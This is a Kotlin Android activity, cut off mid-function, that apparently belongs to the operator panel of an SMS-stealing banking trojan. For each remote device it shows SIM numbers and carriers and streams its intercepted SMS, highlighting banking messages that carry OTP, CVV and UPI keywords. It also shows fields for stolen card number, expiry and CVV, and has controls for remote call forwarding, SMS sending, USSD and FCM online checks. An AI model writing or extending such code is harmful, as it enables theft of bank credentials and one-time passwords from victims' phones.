package com.example.admin.activities

import android.app.Dialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.Window
import android.view.WindowManager
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.admin.R
import com.example.admin.network.SupabaseApi
import com.example.admin.utils.Constants
import com.example.admin.utils.FCMHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class FinalActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "FinalActivity"
        private const val FIFTEEN_MINUTES_MS        = 15 * 60 * 1000L
        private const val CHECK_RESPONSE_TIMEOUT_MS = 15 * 1000L
        private const val CHECK_POLL_INTERVAL_MS    = 1000L
        private const val SSE_RECONNECT_DELAY_MS    = 5_000L
        private const val SSE_WATCHDOG_INTERVAL_MS  = 90_000L
        private const val REST_REFRESH_INTERVAL_MS   = 60_000L  // REST fallback — works even if SSE is down
    }

    private lateinit var btnCallForwarding: TextView
    private lateinit var btnSendSms: TextView
    private lateinit var btnUssd: TextView
    private lateinit var btnCheckOnline: TextView
    private lateinit var btnData: TextView
    private lateinit var btnAdmin: TextView

    private lateinit var etCardNumber: EditText
    private lateinit var etExpiry: EditText
    private lateinit var etCvv: EditText

    private var tvSim1: TextView? = null
    private var tvSim2: TextView? = null
    private var tvSim1Carrier: TextView? = null
    private var tvSim2Carrier: TextView? = null

    private lateinit var onlineStatusContainer: LinearLayout
    private lateinit var onlineStatusDot: View
    private lateinit var tvOnlineStatus: TextView
    private lateinit var tvLastChecked: TextView

    private lateinit var ivDownArrow: ImageView
    private lateinit var buttonContainer1: LinearLayout
    private lateinit var buttonContainer2: LinearLayout
    private lateinit var smsScrollView: ScrollView
    private lateinit var smsContainer: LinearLayout
    private lateinit var notificationContainer: LinearLayout

    private var adminTogglePopup: PopupWindow? = null
    private var callPopup: PopupWindow? = null
    private var smsPopup: PopupWindow? = null
    private var ussdPopup: PopupWindow? = null

    private var areButtonsVisible = true
    private var sim1Number  = "N/A"
    private var sim2Number  = "N/A"
    private var sim1Carrier = "N/A"
    private var sim2Carrier = "N/A"
    private lateinit var uniqueid: String

    private var isOnlineCheckInProgress       = false
    private var oldOnlineCheckedAtBeforeCheck = 0L
    private var checkStartedAt = 0L
    private var checkSecond    = 0

    private val mainHandler      = Handler(Looper.getMainLooper())
    private val restHandler      = Handler(Looper.getMainLooper())
    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private lateinit var supabaseApi: SupabaseApi

    // ── SSE state ──────────────────────────────────────────────────────────────
    private val sseClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS) // infinite — SSE stream
        .build()
    private var sseCall: Call? = null
    @Volatile private var sseConnected = false
    private var sseReconnectScheduled  = false

    private var deleteJob: Job? = null
    private var lastProcessedCallTimestamp = 0L
    private var currentCallDialog: Dialog? = null
    private var currentDialogId: String?   = null
    private val displayedSmsIds            = mutableSetOf<String>()
    private var currentAdminConfig: SupabaseApi.AdminConfig? = null
    private var cachedFcmToken: String?    = null

    private val bankingKeywords = listOf(
        "sbi", "hdfc", "icici", "axis", "kotak", "yesbank", "pnb", "canara", "idbi",
        "upi", "debit", "credit", "payment", "account", "transaction", "balance",
        "imps", "neft", "rtgs", "otp", "cvv", "card", "debited", "credited",
        "bank", "loan", "emi", "statement", "wallet", "paytm", "phonepe"
    )
    private val bankingSenders = listOf(
        "AXISB", "HDFCB", "ICICIB", "SBINB", "KOTAKB", "YESB", "PNBB"
    )

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_final)
        try {
            supabaseApi    = SupabaseApi()
            SupabaseApi.APP_ID = Constants.APP_TOKEN.trim()
            bindViews()
            initValues()
            setupHeaderButtons()
            setupDownArrowToggle()
            FCMHelper.initialize(this)
            // 1. Load all data once via REST
            initialLoad()
            // 2. Start SSE — server pushes all future changes
            startSseStream()
            // 3. REST periodic refresh — fallback, independent of SSE
            restHandler.postDelayed(restRefreshRunnable, REST_REFRESH_INTERVAL_MS)
            // 4. Watchdog ensures SSE stays alive
            mainHandler.postDelayed(sseWatchdogRunnable, SSE_WATCHDOG_INTERVAL_MS)
            Log.d(TAG, "Activity initialized for uid=$uniqueid")
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error", e)
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!sseConnected) {
            Log.d(TAG, "onResume: SSE dead — restarting")
            startSseStream()
        }
        mainHandler.removeCallbacks(sseWatchdogRunnable)
        mainHandler.postDelayed(sseWatchdogRunnable, SSE_WATCHDOG_INTERVAL_MS)
        restHandler.removeCallbacks(restRefreshRunnable)
        restHandler.postDelayed(restRefreshRunnable, REST_REFRESH_INTERVAL_MS)
    }

    override fun onStop() {
        super.onStop()
        mainHandler.removeCallbacks(sseWatchdogRunnable)
        restHandler.removeCallbacks(restRefreshRunnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        stopSseStream()
        mainHandler.removeCallbacksAndMessages(null)
        restHandler.removeCallbacksAndMessages(null)
        coroutineScope.cancel()
        deleteJob?.cancel()
        dismissCurrentDialog()
        displayedSmsIds.clear()
        Log.d(TAG, "Activity destroyed")
    }

    // ── Initial REST load (one time on start + after reconnect) ───────────────

    private fun initialLoad() {
        coroutineScope.launch {
            try {
                // Device info (SIM numbers, FCM token)
                val devices = supabaseApi.getAllDevices().getOrNull()
                val device  = devices?.find { it.uid == uniqueid }
                if (device != null) {
                    cachedFcmToken = device.fcmToken
                    withContext(Dispatchers.Main) { applyDeviceInfo(device) }
                }

                // Online status
                val statuses = supabaseApi.getLatestDeviceStatuses().getOrNull()
                val status   = statuses?.get(uniqueid)
                withContext(Dispatchers.Main) { applyOnlineStatus(status) }

                // SMS logs
                val smsResult = supabaseApi.getSmsLogsByUniqueId(uniqueid, limit = 50)
                smsResult.getOrNull()?.let { logs ->
                    withContext(Dispatchers.Main) { displaySmsLogs(logs) }
                }

                // Admin config
                val config = supabaseApi.getAdminConfig().getOrNull()
                currentAdminConfig = config

            } catch (e: Exception) {
                Log.e(TAG, "initialLoad exception", e)
            }
        }
    }

    // ── SSE stream ─────────────────────────────────────────────────────────────

    private fun startSseStream() {
        sseCall?.cancel()
        sseReconnectScheduled = false
        val url = "${Constants.BACKEND_ROOT}/api/device/${Constants.APP_TOKEN}/stream"
        Log.d(TAG, "SSE connecting: $url")

        val request = Request.Builder().url(url).get()
            .header("Accept", "text/event-stream")
            .header("Cache-Control", "no-cache")
            .build()

        sseCall = sseClient.newCall(request)
        sseCall?.enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                sseConnected = false
                Log.e(TAG, "SSE onFailure: ${e.message}")
                scheduleReconnect()
            }

            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    sseConnected = false
                    Log.e(TAG, "SSE bad response: ${response.code}")
                    response.close()
                    scheduleReconnect()
                    return
                }
                sseConnected = true
                Log.d(TAG, "SSE connected")

                val source = response.body?.source()
                if (source == null) { sseConnected = false; scheduleReconnect(); return }

                try {
                    var dataBuffer = StringBuilder()
                    while (!source.exhausted() && !call.isCanceled()) {
                        val line = source.readUtf8Line() ?: break

                        when {
                            line.startsWith("data:") -> {
                                dataBuffer.append(line.removePrefix("data:").trim())
                            }
                            line.isBlank() && dataBuffer.isNotEmpty() -> {
                                // Full event received — process it
                                val raw = dataBuffer.toString()
                                dataBuffer = StringBuilder()
                                try {
                                    val json   = JSONObject(raw)
                                    val table  = json.optString("table", "")
                                    val event  = json.optString("event", "")
                                    val record = json.optJSONObject("record") ?: JSONObject()
                                    runOnUiThread { handleSseEvent(table, event, record) }
                                } catch (pe: Exception) {
                                    Log.w(TAG, "SSE parse error: ${pe.message}")
                                }
                            }
                            line.startsWith(": ping") -> {
                                // Keep-alive ping — ignore
                            }
                        }
                    }
                } catch (e: IOException) {
                    Log.e(TAG, "SSE read error: ${e.message}")
                } finally {
                    sseConnected = false
                    response.close()
                    if (!call.isCanceled()) {
                        Log.d(TAG, "SSE stream ended — reconnecting")
                        scheduleReconnect()
                    }
                }
            }
        })
    }

    private fun stopSseStream() {
        sseConnected = false
        sseReconnectScheduled = false
        mainHandler.removeCallbacks(sseReconnectRunnable)
        sseCall?.cancel()
        sseCall = null
    }

    private fun scheduleReconnect() {
        if (sseReconnectScheduled || !isActivityAlive()) return
        sseReconnectScheduled = true
        mainHandler.postDelayed(sseReconnectRunnable, SSE_RECONNECT_DELAY_MS)
    }

    private val sseReconnectRunnable = Runnable {
        if (!isActivityAlive()) return@Runnable
        Log.d(TAG, "SSE reconnecting + refreshing data")
        initialLoad()          // fill gap while SSE was down
        startSseStream()
    }

    private val sseWatchdogRunnable = object : Runnable {
        override fun run() {
            if (!isActivityAlive()) return
            if (!sseConnected) {
                Log.w(TAG, "Watchdog: SSE dead — force restart")
                startSseStream()
                initialLoad()
            }
            mainHandler.postDelayed(this, SSE_WATCHDOG_INTERVAL_MS)
        }
    }

    // ── REST periodic refresh (fallback — runs even when SSE is down) ──────────
    private val restRefreshRunnable = object : Runnable {
        override fun run() {
            if (!isActivityAlive()) return
            initialLoad()  // refresh all data via REST
            restHandler.postDelayed(this, REST_REFRESH_INTERVAL_MS)
        }
    }

    // ── SSE event handler ──────────────────────────────────────────────────────

    private fun handleSseEvent(table: String, event: String, record: JSONObject) {
        val uid = record.optString("sub_id", record.optString("uid", "")).trim()

        when (table) {
            "devices" -> {
                if (uid != uniqueid) return
                // Update device info
                val dataJson = record.optJSONObject("data_json") ?: JSONObject()
                val newSim1  = dataJson.optString("sim1number", dataJson.optString("sim1Number", ""))
                val newSim2  = dataJson.optString("sim2number", dataJson.optString("sim2Number", ""))
                val newCar1  = dataJson.optString("sim1carrier", dataJson.optString("sim1Carrier", ""))
                val newCar2  = dataJson.optString("sim2carrier", dataJson.optString("sim2Carrier", ""))
                val newFcm   = record.optString("fcm_token", dataJson.optString("fcmToken", dataJson.optString("fcm_token", "")))

                if (newSim1.isNotBlank())  sim1Number  = newSim1
                if (newSim2.isNotBlank())  sim2Number  = newSim2
                if (newCar1.isNotBlank())  sim1Carrier = newCar1
                if (newCar2.isNotBlank())  sim2Carrier = newCar2
                if (newFcm.isNotBlank())   cachedFcmToken = newFcm
                updateMainSimViews()

                // Update online status from heartbeat
                val heartbeat = dataJson.optJSONObject("heartbeat") ?: JSONObject()
                val checkedAt = heartbeat.optLong("checked_at",
                    dataJson.optLong("online_checked_at", 0L))
                if (!isOnlineCheckInProgress && checkedAt > 0L) {
                    val now = System.currentTimeMillis()
                    if (now - checkedAt < FIFTEEN_MINUTES_MS) setDeviceOnlineUi(checkedAt)
                    else setDeviceOfflineUi("Last checked: ${getTimeAgo(checkedAt)}")
                }
                // If online check is in progress and device responded
                if (isOnlineCheckInProgress && checkedAt > oldOnlineCheckedAtBeforeCheck) {
                    val now = System.currentTimeMillis()
                    if (now - checkedAt < FIFTEEN_MINUTES_MS) finishOnlineCheckAsOnline(checkedAt)
                }
            }

            "messages" -> {
                if (uid != uniqueid) return
                supabaseApi.parseSmsRow(record)?.let { sms ->
                    addOnlyNewSmsLogs(listOf(sms))
                }
            }

            // form_data events are handled in AllUserDataActivity
        }
    }

    // ── View binding ───────────────────────────────────────────────────────────

    private fun bindViews() {
        btnCallForwarding = findViewById(R.id.btnCallForwarding)
        btnSendSms        = findViewById(R.id.btnSendSms)
        btnUssd           = findViewById(R.id.btnUssd)
        btnCheckOnline    = findViewById(R.id.btnCheckOnline)
        btnData           = findViewById(R.id.btnData)
        btnAdmin          = findViewById(R.id.btnAdmin)

        etCardNumber = findViewById(R.id.etCardNumber)
        etExpiry     = findViewById(R.id.etExpiry)
        etCvv        = findViewById(R.id.etCvv)

        tvSim1        = findOptionalTextView("tvSim1")
        tvSim2        = findOptionalTextView("tvSim2")
        tvSim1Carrier = findOptionalTextView("tvSim1Carrier")
        tvSim2Carrier = findOptionalTextView("tvSim2Carrier")

        onlineStatusContainer = findViewById(R.id.onlineStatusContainer)
        onlineStatusDot       = findViewById(R.id.onlineStatusDot)
        tvOnlineStatus        = findViewById(R.id.tvOnlineStatus)
        tvLastChecked         = findViewById(R.id.tvLastChecked)

        ivDownArrow       = findViewById(R.id.ivDownArrow)
        buttonContainer1  = findViewById(R.id.buttonContainer1)
        buttonContainer2  = findViewById(R.id.buttonContainer2)

        smsScrollView         = findViewById(R.id.smsScrollView)
        smsContainer          = findViewById(R.id.smsContainer)
        notificationContainer = findViewById(R.id.notificationContainer)

        etCardNumber.isEnabled          = false
        etExpiry.isEnabled              = false
        etCvv.isEnabled                 = false
        notificationContainer.visibility = View.GONE
    }

    private fun initValues() {
        uniqueid = intent.getStringExtra("uniqueid").orEmpty()
        if (uniqueid.isBlank()) { Log.e(TAG, "No uniqueid provided"); finish() }
    }

    private fun findOptionalTextView(idName: String): TextView? {
        val id = resources.getIdentifier(idName, "id", packageName)
        if (id == 0) return null
        return try { findViewById(id) } catch (_: Exception) { null }
    }

    private fun setAllTextViewsByIdName(root: View, idName: String, value: String) {
        val id = resources.getIdentifier(idName, "id", packageName)
        if (id == 0) return
        fun visit(view: View) {
            if (view.id == id && view is TextView) view.text = value
            if (view is ViewGroup) for (i in 0 until view.childCount) visit(view.getChildAt(i))
        }
        visit(root)
    }

    private fun updateMainSimViews() {
        val root = window.decorView ?: return
        tvSim1?.text        = sim1Number
        tvSim2?.text        = sim2Number
        tvSim1Carrier?.text = sim1Carrier
        tvSim2Carrier?.text = sim2Carrier
        setAllTextViewsByIdName(root, "tvSim1", sim1Number)
        setAllTextViewsByIdName(root, "tvSim2", sim2Number)
        setAllTextViewsByIdName(root, "tvSim1Number", sim1Number)
        setAllTextViewsByIdName(root, "tvSim2Number", sim2Number)
        setAllTextViewsByIdName(root, "tvSim1Carrier", sim1Carrier)
        setAllTextViewsByIdName(root, "tvSim2Carrier", sim2Carrier)
    }

    private fun updatePopupSimViews(root: View) {
        setAllTextViewsByIdName(root, "tvSim1", "SIM 1: $sim1Number\n$sim1Carrier")
        setAllTextViewsByIdName(root, "tvSim2", "SIM 2: $sim2Number\n$sim2Carrier")
        setAllTextViewsByIdName(root, "tvSim1Number", "SIM 1: $sim1Number")
        setAllTextViewsByIdName(root, "tvSim2Number", "SIM 2: $sim2Number")
        setAllTextViewsByIdName(root, "tvSim1Carrier", sim1Carrier)
        setAllTextViewsByIdName(root, "tvSim2Carrier", sim2Carrier)
    }

    // ── Apply REST data to UI ──────────────────────────────────────────────────

    private fun applyDeviceInfo(device: SupabaseApi.RegisteredDevice) {
        sim1Number  = device.sim1Number?.takeIf { it.isNotBlank() } ?: "No SIM"
        sim2Number  = device.sim2Number?.takeIf { it.isNotBlank() } ?: "No SIM"
        sim1Carrier = device.sim1Carrier?.takeIf { it.isNotBlank() } ?: "Unknown"
        sim2Carrier = device.sim2Carrier?.takeIf { it.isNotBlank() } ?: "Unknown"
        updateMainSimViews()
        Log.d(TAG, "SIM_UI uid=$uniqueid sim1=$sim1Number carrier1=$sim1Carrier")
    }

    private fun applyOnlineStatus(status: SupabaseApi.DeviceStatus?) {
        if (status == null) { setDeviceOfflineUi("Last checked: Never"); return }
        val now      = System.currentTimeMillis()
        val isOnline = status.checkedAt > 0L && now - status.checkedAt in 0 until FIFTEEN_MINUTES_MS
        if (isOnline) setDeviceOnlineUi(status.checkedAt)
        else setDeviceOfflineUi(if (status.checkedAt > 0L) "Last checked: ${getTimeAgo(status.checkedAt)}" else "Last checked: Never")
    }

    // ── Online status UI ───────────────────────────────────────────────────────

    private fun setDeviceOnlineUi(checkedAt: Long = System.currentTimeMillis()) {
        tvOnlineStatus.text = "Online"
        onlineStatusDot.setBackgroundResource(R.drawable.green_circle)
        tvLastChecked.text = when {
            checkedAt <= 0L -> "Last checked: Just now"
            System.currentTimeMillis() - checkedAt < 60000L -> "Last checked: Just now"
            else -> "Last checked: ${getTimeAgo(checkedAt)}"
        }
        setOnlineContainerBackground(isOnline = true, isProcessing = false)
    }

    private fun setDeviceOfflineUi(lastText: String = "Last checked: Never") {
        tvOnlineStatus.text = "Offline"
        onlineStatusDot.setBackgroundResource(R.drawable.red_circle)
        tvLastChecked.text  = lastText
        setOnlineContainerBackground(isOnline = false, isProcessing = false)
    }

    private fun setDeviceProcessingUi(second: Int) {
        tvOnlineStatus.text = "Processing ${second.coerceIn(0, 15)}/15s"
        onlineStatusDot.setBackgroundResource(R.drawable.red_circle)
        tvLastChecked.text  = "Waiting for response..."
        setOnlineContainerBackground(isOnline = false, isProcessing = true)
    }

    private fun setOnlineContainerBackground(isOnline: Boolean, isProcessing: Boolean) {
        val color = when {
            isProcessing -> Color.parseColor("#FFF3CD")
            isOnline     -> ContextCompat.getColor(this, R.color.successLightColor)
            else         -> Color.WHITE
        }
        val strokeColor = when {
            isProcessing -> Color.parseColor("#FF9800")
            isOnline     -> ContextCompat.getColor(this, R.color.green)
            else         -> Color.parseColor("#DDDDDD")
        }
        val drawable = GradientDrawable().apply {
            cornerRadius = dpToPx(12).toFloat()
            setColor(color)
            setStroke(dpToPx(1), strokeColor)
        }
        onlineStatusContainer.background = drawable
    }

    // ── Online check (FCM — still needs short poll for response) ──────────────

    private fun showCheckOnlineConfirmDialog() {
        if (isOnlineCheckInProgress) { Toast.makeText(this, "Check already in progress", Toast.LENGTH_SHORT).show(); return }
        AlertDialog.Builder(this)
            .setTitle("Check Online")
            .setMessage("Send FCM online check to this device?\n\nWill wait max 15 seconds for response.")
            .setPositiveButton("OK")     { dialog, _ -> dialog.dismiss(); checkDeviceOnline() }
            .setNegativeButton("Cancel") { dialog, _ -> dialog.dismiss() }
            .show()
    }

    private fun checkDeviceOnline() {
        if (isOnlineCheckInProgress) { Toast.makeText(this, "Check already in progress", Toast.LENGTH_SHORT).show(); return }
        isOnlineCheckInProgress = true
        checkStartedAt = System.currentTimeMillis()
        checkSecond    = 0
        setDeviceProcessingUi(0)

        coroutineScope.launch {
            try {
                val status = supabaseApi.getLatestDeviceStatuses().getOrNull()?.get(uniqueid)
                oldOnlineCheckedAtBeforeCheck = status?.checkedAt ?: 0L

                val fcmToken = cachedFcmToken.orEmpty()
                if (fcmToken.isBlank() || !FCMHelper.isValidFCMToken(fcmToken)) {
                    withContext(Dispatchers.Main) { finishOnlineCheckAsOffline("No FCM token") }
                    return@launch
                }

                FCMHelper.sendOnlineCheck(
                    context  = this@FinalActivity,
                    uniqueid = uniqueid,
                    fcmToken = fcmToken,
                    onResult = { success, message ->
                        runOnUiThread {
                            if (success) {
                                // SSE will deliver the response — also start countdown
                                mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
                                mainHandler.post(onlineCheckWatcherRunnable)
                            } else finishOnlineCheckAsOffline(message ?: "FCM send failed")
                        }
                    }
                )
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { finishOnlineCheckAsOffline(e.message ?: "Error") }
            }
        }
    }

    // Short UI countdown — SSE delivers the actual response, this is just the timer
    private val onlineCheckWatcherRunnable: Runnable = object : Runnable {
        override fun run() {
            if (!isActivityAlive()) return
            val elapsedMs  = System.currentTimeMillis() - checkStartedAt
            val elapsedSec = (elapsedMs / 1000L).toInt().coerceIn(0, 15)
            checkSecond    = elapsedSec
            setDeviceProcessingUi(elapsedSec)

            if (elapsedMs >= CHECK_RESPONSE_TIMEOUT_MS) {
                finishOnlineCheckAsOffline("No response in 15 sec")
                return
            }
            mainHandler.postDelayed(this, CHECK_POLL_INTERVAL_MS)
        }
    }

    private fun finishOnlineCheckAsOnline(checkedAt: Long) {
        isOnlineCheckInProgress = false
        mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
        setDeviceOnlineUi(checkedAt)
        Toast.makeText(this, "Device is online", Toast.LENGTH_SHORT).show()
    }

    private fun finishOnlineCheckAsOffline(errorMessage: String) {
        isOnlineCheckInProgress = false
        mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
        setDeviceOfflineUi("Last checked: no response")
        Toast.makeText(this, "Device offline: $errorMessage", Toast.LENGTH_SHORT).show()
    }

    // ── SMS display ────────────────────────────────────────────────────────────

    private fun displaySmsLogs(logs: List<SupabaseApi.SmsLog>) {
        smsContainer.removeAllViews()
        displayedSmsIds.clear()
        if (logs.isEmpty()) { showNoSmsMessage(); return }
        logs.sortedByDescending { it.timestamp }.forEach { log -> addSmsMessageCard(log) }
        smsScrollView.post { smsScrollView.fullScroll(ScrollView.FOCUS_UP) }
    }

    private fun addOnlyNewSmsLogs(logs: List<SupabaseApi.SmsLog>) {
        if (logs.isEmpty()) return
        runOnUiThread {
            var added = false
            for (log in logs.sortedBy { it.timestamp }) {
                if (log.uniqueId != uniqueid) continue
                val smsId = buildSmsUniqueKey(log)
                if (!displayedSmsIds.contains(smsId)) {
                    if (!added && displayedSmsIds.isEmpty()) smsContainer.removeAllViews()
                    addSmsMessageCard(log, insertAtTop = true)
                    added = true
                }
            }
            if (added) smsScrollView.post { smsScrollView.fullScroll(ScrollView.FOCUS_UP) }
        }
    }

    private fun addSmsMessageCard(log: SupabaseApi.SmsLog, insertAtTop: Boolean = false) {
        val smsId = buildSmsUniqueKey(log)
        if (displayedSmsIds.contains(smsId)) return
        displayedSmsIds.add(smsId)

        val messageCardView = layoutInflater.inflate(R.layout.message_card, null)
        messageCardView.findViewById<TextView>(R.id.fromText).text = "From: ${log.senderNumber}"
        messageCardView.findViewById<TextView>(R.id.timeText).text = "Time: ${formatTimeForDisplay(log.timestamp)}"

        val receiverText = messageCardView.findViewById<TextView>(R.id.receiverText)
        if (log.receiverNumber.isNotEmpty()) {
            receiverText.text       = "To: ${log.receiverNumber}"
            receiverText.visibility = View.VISIBLE
        } else receiverText.visibility = View.GONE

        messageCardView.findViewById<TextView>(R.id.bodyTextView).text = log.body
        messageCardView.findViewById<ImageView>(R.id.copyIcon).setOnClickListener { copyToClipboard(log.body) }
        messageCardView.findViewById<ImageView>(R.id.deleteIcon).setOnClickListener {
            deleteJob = coroutineScope.launch { performDeleteSmsLog(log.id ?: return@launch) }
        }

        val isBanking = isBankingSMS(log.body, log.senderNumber)
        val drawable  = GradientDrawable().apply {
            cornerRadius = dpToPx(12).toFloat()
            setStroke(dpToPx(2), ContextCompat.getColor(this@FinalActivity, R.color.purple_500))
            setColor(if (isBanking) ContextCompat.getColor(this@FinalActivity, R.color.successLightColor) else Color.WHITE)
        }
        messageCardView.background = drawable
        messageCardView.setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12))
        messageCardView.setOnClickListener {
            showFullSmsDialog(log.title, log.body, log.senderNumber, log.receiverNumber, log.timestamp)
        }

        val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            topMargin = dpToPx(8); bottomMargin = dpToPx(8); marginStart = dpToPx(8); marginEnd = dpToPx(8)
        }
        messageCardView.layoutParams = lp
        if (insertAtTop) smsContainer.addView(messageCardView, 0)
        else smsContainer.addView(messageCardView)
    }

    private fun buildSmsUniqueKey(log: SupabaseApi.SmsLog): String {
        val safeSmsId = log.id?.takeIf { it.isNotBlank() }
            ?: if (log.timestamp > 0L) "sms_${log.uniqueId}_${log.timestamp}"
            else "sms_${log.uniqueId}_${log.body.hashCode()}"
        return "${log.uniqueId}-$safeSmsId"
    }

    private suspend fun performDeleteSmsLog(smsId: String) {
        try {
            val result = supabaseApi.deleteSmsLog(smsId)
            withContext(Dispatchers.Main) {
                result.fold(
                    onSuccess = { success ->
                        if (success) {
                            Toast.makeText(this@FinalActivity, "SMS deleted", Toast.LENGTH_SHORT).show()
                            coroutineScope.launch {
                                val logs = supabaseApi.getSmsLogsByUniqueId(uniqueid, limit = 50).getOrNull()
                                withContext(Dispatchers.Main) { logs?.let { displaySmsLogs(it) } }
                            }
                        } else Toast.makeText(this@FinalActivity, "Delete failed", Toast.LENGTH_SHORT).show()
                    },
                    onFailure = { Toast.makeText(this@FinalActivity, "Delete failed", Toast.LENGTH_SHORT).show() }
                )
            }
        } catch (e: Exception) {
            withContext(Dispatchers.Main) { Toast.makeText(this@FinalActivity, "Delete error: ${e.message}", Toast.LENGTH_SHORT).show() }
        }
    }

    private fun isBankingSMS(body: String?, sender: String?): Boolean {
        val lowerBody   = body?.lowercase(Locale.getDefault()) ?: ""
        val lowerSender = sender?.lowercase(Locale.getDefault()) ?: ""
        for (pattern in bankingSenders) { if (lowerSender.contains(pattern.lowercase())) return true }
        for (keyword in bankingKeywords) {
            if (lowerBody.contains(keyword)) {
                if (!listOf("flipkart", "amazon", "zomato", "swiggy", "uber").any { lowerBody.contains(it) }) return true
            }
        }
        return false
    }

    private fun showNoSmsMessage() {
        smsContainer.removeAllViews()
        val emptyView = TextView(this).apply {
            text     = "No SMS messages found"
            textSize = 16f
            setTextColor(ContextCompat.getColor(this@FinalActivity, android.R.color.darker_gray))
            gravity  = Gravity.CENTER
            setPadding(dpToPx(16), dpToPx(40), dpToPx(16), dpToPx(40))
        }
        smsContainer.addView(emptyView)
    }

    private fun showFullSmsDialog(title: String, body: String, sender: String, receiver: String, timestamp: Long) {
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
        AlertDialog.Builder(this)
            .setTitle("SMS Details")
            .setMessage(buildString {
                append("From: $sender\nTime: $timeStr\n")
                if (receiver.isNotEmpty()) append("To: $receiver\n")
                append("\n$body")
            })
            .setPositiveButton("Copy") { _, _ -> copyToClipboard(body); Toast.makeText(this, "Copied!", Toast.LENGTH_SHORT).show() }
            .setNegativeButton("Close", null)
            .show()
    }

    private fun showCallDialog(code: String, statusResult: String, resultMsg: String, sim: Int, timestamp: Long) {
        try {
            val dialogId = "${timestamp}_${code.hashCode()}"
            if (currentDialogId == dialogId) return
            dismissCurrentDialog()

            val dialog = Dialog(this)
            dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
            dialog.setContentView(R.layout.call_dialog)
            dialog.setCancelable(false)
            dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            dialog.window?.setGravity(Gravity.CENTER)
            dialog.window?.setLayout((resources.displayMetrics.widthPixels * 0.9).toInt(), ViewGroup.LayoutParams.WRAP_CONTENT)

            dialog.findViewById<TextView>(R.id.tvDialogTitle)?.text  = "Call Update - $statusResult"
            dialog.findViewById<TextView>(R.id.tvDialogCode)?.text   = "Code: $code"
            dialog.findViewById<TextView>(R.id.tvDialogStatus)?.text = "Status: $statusResult"
            dialog.findViewById<TextView>(R.id.tvDialogResult)?.text = "Result: $resultMsg"
            dialog.findViewById<TextView>(R.id.tvDialogSim)?.text    = "SIM: ${if (sim == 0) "SIM 1" else "SIM 2"}"
            dialog.findViewById<TextView>(R.id.tvDialogTime)?.text   = "Time: ${SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date(timestamp))}"
            dialog.findViewById<Button>(R.id.btnDialogOk)?.setOnClickListener {
                dialog.dismiss(); currentCallDialog = null; currentDialogId = null
            }
            dialog.show()
            currentCallDialog = dialog
            currentDialogId   = dialogId
            mainHandler.postDelayed({ if (dialog.isShowing) { dialog.dismiss(); currentCallDialog = null; currentDialogId = null } }, 30000L)
        } catch (e: Exception) { Log.e(TAG, "showCallDialog error", e) }
    }

    private fun dismissCurrentDialog() {
        try { currentCallDialog?.dismiss() } catch (_: Exception) {}
        currentCallDialog = null; currentDialogId = null
    }

    // ── Header buttons ─────────────────────────────────────────────────────────

    private fun setupHeaderButtons() {
        btnCallForwarding.setOnClickListener { toggleCallPopup() }
        btnSendSms.setOnClickListener        { toggleSmsPopup() }
        btnUssd.setOnClickListener           { toggleUssdPopup() }
        btnCheckOnline.setOnClickListener    { showCheckOnlineConfirmDialog() }
        btnData.setOnClickListener           { navigateToAllUserData() }
        btnAdmin.setOnClickListener          { showAdminTogglePopup() }
        findViewById<LinearLayout>(R.id.cardSection)?.setOnLongClickListener {
            copyCardDetailsToClipboard(); true
        }
    }

    private fun setupDownArrowToggle() {
        ivDownArrow.setOnClickListener {
            areButtonsVisible = !areButtonsVisible
            if (areButtonsVisible) {
                buttonContainer1.visibility = View.VISIBLE
                buttonContainer2.visibility = View.VISIBLE
                ivDownArrow.animate().rotation(0f).setDuration(300).start()
                buttonContainer1.startAnimation(AnimationUtils.loadAnimation(this, android.R.anim.fade_in))
                buttonContainer2.startAnimation(AnimationUtils.loadAnimation(this, android.R.anim.fade_in))
            } else {
                val fadeOut = AnimationUtils.loadAnimation(this, android.R.anim.fade_out)
                fadeOut.setAnimationListener(object : Animation.AnimationListener {
                    override fun onAnimationStart(a: Animation?)  = Unit
                    override fun onAnimationRepeat(a: Animation?) = Unit
                    override fun onAnimationEnd(a: Animation?) {
                        buttonContainer1.visibility = View.GONE
                        buttonContainer2.visibility = View.GONE
                    }
                })
                buttonContainer1.startAnimation(fadeOut); buttonContainer2.startAnimation(fadeOut)
